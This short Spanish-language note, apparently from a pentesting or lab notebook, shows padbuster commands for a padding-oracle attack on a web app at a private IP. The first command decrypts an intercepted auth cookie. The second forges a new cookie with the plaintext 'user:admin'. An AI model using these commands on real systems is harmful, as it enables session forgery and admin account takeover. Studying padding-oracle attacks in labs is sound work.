- Tags: #padbustes #padding_oracle #recursos_github 
...
```bash
#Valor de la cookie interceptada auth=QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn

padbuster http://192.168.111.35/index.php QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn 8 -cookies 'auth=QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn'

#Esto nos da el texto claro de la cadena, partiendo de aqui podemos crear una nueva cookie de session 

padbuster http://192.168.111.35/index.php QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn 8 -cookies 'auth=QG9eSXk3XcfP6cIv1RoZVKxjq5jHY3Dn' -plaintext "user:admin"
```